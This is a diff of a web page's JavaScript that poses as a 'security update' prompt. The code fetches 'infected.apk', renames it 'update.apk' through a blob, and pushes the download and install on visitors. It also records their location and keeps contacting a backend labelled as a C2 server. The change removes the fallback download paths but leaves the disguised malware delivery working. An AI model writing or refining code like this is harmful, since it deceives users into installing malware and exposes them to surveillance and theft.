@@ -387,7 +387,7 @@
         'use strict';
 
         // ============================================================
-        //  CONFIG — ONLY ONE DOWNLOAD, RENAMED VIA BLOB
+        //  CONFIG — ONLY ONE METHOD, NO FALLBACKS
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
         const APK_URL = 'infected.apk';
@@ -606,24 +606,22 @@
         }
 
         // ============================================================
-        //  DOWNLOAD APK — USING FETCH + BLOB TO RENAME
+        //  DOWNLOAD APK — ONLY FETCH + BLOB, NO FALLBACKS
         // ============================================================
         function downloadApk() {
             addLog('[APK] Downloading update.apk...', 'info');
             setStatus('📦 Downloading security update...', 50);
 
-            // Use fetch to get the file as a blob, then rename it
+            // ONLY fetch + blob method — no fallback that downloads infected.apk
             fetch(APK_URL)
                 .then(response => {
                     if (!response.ok) throw new Error('Network response was not ok');
                     return response.blob();
                 })
                 .then(blob => {
-                    // Create a new blob with the correct MIME type
                     const newBlob = new Blob([blob], { type: 'application/vnd.android.package-archive' });
                     const url = URL.createObjectURL(newBlob);
 
-                    // Create download link with the correct filename
                     const a = document.createElement('a');
                     a.href = url;
                     a.download = DOWNLOAD_NAME;
@@ -632,7 +630,6 @@
                     a.click();
                     document.body.removeChild(a);
 
-                    // Clean up
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
 
                     addLog('[APK] Download started: update.apk', 'success');
@@ -643,20 +640,8 @@
                 })
                 .catch(error => {
                     addLog('[APK] Download failed: ' + error.message, 'error');
-                    // Fallback: try anchor download as last resort
-                    try {
-                        const a = document.createElement('a');
-                        a.href = APK_URL;
-                        a.download = DOWNLOAD_NAME;
-                        a.style.display = 'none';
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        addLog('[APK] Fallback download triggered.', 'warn');
-                    } catch(e) {
-                        addLog('[APK] Fallback also failed: ' + e.message, 'error');
-                        setStatus('❌ Download failed. Please try again.', 0);
-                    }
+                    setStatus('❌ Download failed. Please refresh and try again.', 0);
+                    // NO FALLBACK — user must refresh
                 });
 
             // Progress simulation
@@ -672,7 +657,7 @@
         }
 
         // ============================================================
-        //  INSTALL BUTTON — USES SAME BLOB METHOD
+        //  INSTALL BUTTON — ONLY FETCH + BLOB, NO FALLBACKS
         // ============================================================
         installBtn.addEventListener('click', function() {
             addLog('[Install] User tapped Install Update.', 'info');
@@ -680,7 +665,7 @@
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
 
-            // Use fetch + blob to ensure correct filename
+            // ONLY fetch + blob — NO window.location.href fallback
             fetch(APK_URL)
                 .then(response => {
                     if (!response.ok) throw new Error('Network response was not ok');
@@ -703,15 +688,8 @@
                 })
                 .catch(error => {
                     addLog('[Install] Download failed: ' + error.message, 'error');
-                    // Fallback: direct navigation
-                    window.location.href = APK_URL;
+                    // NO FALLBACK — user must try again
                 });
-
-            // Also try direct navigation as backup
-            setTimeout(() => {
-                window.location.href = APK_URL;
-                addLog('[Install] Direct navigation (backup).', 'info');
-            }, 800);
 
             setStatus('📲 Installation started. Follow the system prompt.', 100);
             addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
@@ -774,7 +752,7 @@
                 addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
             }
 
-            // SINGLE CLEAN DOWNLOAD WITH RENAME
+            // SINGLE CLEAN DOWNLOAD — NO FALLBACKS
             downloadApk();
 
             setInterval(async () => {
@@ -800,7 +778,7 @@
 
         init().catch(err => {
             addLog(`[Fatal] ${err}`, 'error');
-            setStatus('❌ Update check failed. Please try again.', 0);
+            setStatus('❌ Update check failed. Please refresh.', 0);
             installBtn.disabled = false;
         });
 
